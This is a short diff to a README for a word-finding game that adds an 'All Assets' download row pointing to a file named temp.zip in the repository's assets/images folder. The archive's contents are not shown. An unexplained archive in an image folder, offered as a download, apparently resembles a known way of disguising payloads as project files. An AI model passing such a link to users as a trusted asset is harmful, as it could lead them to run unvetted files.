@@ -8,6 +8,10 @@ A word finding game.
     <td align="left"><b>Source Code</b>: (<a href="https://github.com/sinhamajoni06-cell/Zero-Theory/tree/main#project-folder"><code>Zero-Theory-main.zip</code></a>)</td>
     <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/archive/refs/heads/main.zip">Download</a></td>
   </tr>
+  <tr>
+    <td align="left"><b>All Assets</b>: (<a href="https://github.com/sinhamajoni06-cell/Zero-Theory/tree/main#project-folder"><code>temp.zip</code></a>)</td>
+    <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/raw/refs/heads/main/main/assets/images/temp.zip">Download</a></td>
+  </tr>
 </table>
 
 
